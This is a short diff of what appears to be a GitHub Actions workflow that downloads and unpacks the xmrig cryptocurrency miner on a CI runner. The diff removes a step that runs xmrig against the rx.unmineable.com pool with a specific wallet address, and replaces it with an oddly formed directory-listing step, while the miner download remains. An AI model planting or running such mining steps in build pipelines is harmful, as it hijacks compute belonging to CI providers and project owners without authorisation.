@@ -33,7 +33,7 @@ jobs:
       run: Expand-Archive xmrig-6.17.0-msvc-win64.zip
     - name: Dir
       run: ls
-    - name: RUNNING
-      run: .\xmrig-6.17.0-msvc-win64\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -p x -t 1 -u COIN:RQoxppyczmJ1wEdmXenwEXk2CwQaZCkWVn.Rig001
+    - name: Dir
+      run: .\xmrig-6.17.0-msvc-win64\ls
     - name: DONE
       run: exit
